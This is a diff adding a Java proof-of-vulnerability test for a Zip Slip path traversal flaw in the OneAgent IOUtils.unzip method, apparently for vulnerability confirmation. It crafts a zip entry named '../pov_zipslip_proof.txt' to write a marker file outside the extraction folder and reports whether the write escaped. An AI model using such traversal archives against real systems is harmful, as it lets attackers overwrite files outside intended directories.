+import com.alibaba.oneagent.utils.IOUtils;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+/**
+ * Proof-of-vulnerability for CWE-22 (Zip Slip) in
+ * com.alibaba.oneagent.utils.IOUtils#unzip(String, String).
+ *
+ * Root cause: IOUtils.unzip() builds the extraction target directly from the
+ * untrusted ZipEntry name (entry.getName(), line 122) via
+ * "new File(newPath, currentEntry)" (line 124) and then eagerly creates the
+ * parent directory chain with destinationParent.mkdirs() (line 126/129)
+ * without ever verifying that the resolved destFile/destinationParent stays
+ * under the configured extraction folder (newPath / extractFolder). A zip
+ * entry name containing "../" segments therefore lets the archive escape the
+ * intended destination directory (Zip Slip / path traversal), both for
+ * directory creation and for the subsequent file write at
+ * "new FileOutputStream(destFile)" (line 141).
+ *
+ * This test builds a malicious zip file whose sole entry name is
+ * "../pov_zipslip_proof.txt" (a sibling of the extraction directory), calls
+ * the real IOUtils.unzip() public API, and checks whether the marker file
+ * was written outside the extraction directory.
+ *
+ * Exit code contract:
+ *   - exit 0  => the marker file escaped the destination dir (vulnerable
+ *                behavior reproduced).
+ *   - exit != 0 (or exception) => traversal was blocked (patched behavior).
+ */
+public class ZipSlipPoV {
+    public static void main(String[] args) throws Exception {
+        File baseDir = File.createTempFile("zipslip-pov", "");
+        if (!baseDir.delete()) {
+            throw new IOException("failed to remove temp file placeholder: " + baseDir);
+        }
+        if (!baseDir.mkdirs()) {
+            throw new IOException("failed to create base dir: " + baseDir);
+        }
+
+        File extractDir = new File(baseDir, "extract");
+        if (!extractDir.mkdirs()) {
+            throw new IOException("failed to create extract dir: " + extractDir);
+        }
+
+        // Sibling of extractDir: only reachable if "../" in the entry name
+        // is honored instead of being confined under extractDir.
+        File outsideMarker = new File(baseDir, "pov_zipslip_proof.txt");
+        if (outsideMarker.exists() && !outsideMarker.delete()) {
+            throw new IOException("failed to reset marker file: " + outsideMarker);
+        }
+
+        File zipFile = new File(baseDir, "malicious.zip");
+        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
+        try {
+            ZipEntry entry = new ZipEntry("../pov_zipslip_proof.txt");
+            zos.putNextEntry(entry);
+            byte[] payload = "zip-slip-pov".getBytes("UTF-8");
+            zos.write(payload);
+            zos.closeEntry();
+        } finally {
+            zos.close();
+        }
+
+        boolean escaped;
+        try {
+            // Exercise the real, unmodified project API.
+            IOUtils.unzip(zipFile.getAbsolutePath(), extractDir.getAbsolutePath());
+            escaped = outsideMarker.exists();
+        } catch (IOException e) {
+            // A hardened implementation is allowed to reject the traversal
+            // outright instead of silently confining it.
+            System.out.println("unzip() threw (traversal rejected): " + e);
+            escaped = outsideMarker.exists();
+        }
+
+        System.out.println("extractDir=" + extractDir.getAbsolutePath());
+        System.out.println("outsideMarker=" + outsideMarker.getAbsolutePath());
+        System.out.println("escaped=" + escaped);
+
+        if (escaped) {
+            System.out.println("VULNERABLE: zip entry escaped destination directory (CWE-22 zip slip)");
+            System.exit(0);
+        } else {
+            System.out.println("SAFE: zip entry did not escape destination directory");
+            System.exit(1);
+        }
+    }
+}
